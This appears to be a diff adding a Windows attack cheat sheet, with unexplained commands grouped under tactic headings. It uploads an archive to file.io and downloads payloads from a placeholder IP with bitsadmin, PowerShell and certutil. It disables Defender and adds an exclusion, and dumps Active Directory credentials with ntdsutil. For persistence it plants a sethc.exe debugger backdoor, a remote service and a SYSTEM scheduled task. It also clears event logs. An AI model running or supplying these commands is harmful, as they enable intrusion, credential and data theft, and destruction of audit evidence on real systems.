@@ -1,0 +1,59 @@
+Exfiltration
+
+cmd.exe /C curl -F "file=C:\ProgramData\Network Security\archive.zip" --ssl-no-revoke https://file.io
+
+
+
+
+
+
+
+
+Command and Control
+
+cmd.exe /c bitsadmin /transfer n http://<ip>/1.txt C:\ProgramData\Network Security\connection.config 
+
+powershell iwr -Uri http://<ip>/1.txt -OutFile C:\ProgramData\Network Security\connection.config  -UseBasicParsing
+
+cmd.exe /c certutil -urlcache -split -f http://<ip>/NetworkSecurity_Update.exe C:\ProgramData\Network Security\NetworkSecurity_Update.exe
+
+
+
+
+
+
+
+
+Defense Evasion
+
+powershell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True
+powershell.exe Add-MpPreference -ExclusionPath "C:\ProgramData\Network Security\NetworkSecurity_Update.exe"
+
+
+
+
+ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp" q q
+
+
+IFEO
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d "cmd.exe"
+
+
+Service Creation
+
+sc \\<ip> create NetworkSecurity_Update binpath= "C:\ProgramData\Network Security\NetworkSecurity_Update.exe"
+
+
+Schtasks
+
+attrib +s NetworkSecurity_Update.exe
+schtasks /Create /Tn NetworkSecurity_Update /sc daily /st 11:50 /tr "C:\ProgramData\Network Security\NetworkSecurity_Update.exe" /ru system /f
+schtasks /run /Tn NetworkSecurity_Update
+
+
+clear log
+
+wevtutil cl system
+wevtutil cl security
+wevtutil cl application
